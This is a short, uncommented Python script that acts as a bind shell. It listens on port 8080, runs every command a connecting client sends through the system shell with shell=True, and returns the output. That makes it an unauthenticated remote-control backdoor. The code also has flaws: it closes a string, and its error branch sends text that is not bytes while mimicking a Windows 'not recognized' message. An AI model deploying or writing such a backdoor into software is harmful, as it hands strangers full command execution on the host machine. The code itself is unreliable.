import socket
import subprocess

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
a = socket.gethostbyname(socket.gethostname())
print(a)
s.bind((str(a), 8080))

s.listen(2)

(clientsocket, address) = s.accept()

try :
    command = clientsocket.recv(2048).decode()

    while command != "exit":
        print(command)
        command = str(command)
        result = subprocess.check_output(command, shell=True)
        print(result)
        clientsocket.send(result)
        command = clientsocket.recv(2048).decode()
    command.close()
except:
    clientsocket.send(f"{command} is not recognized as an internal or external command,operable program or batch file. ")
s.close()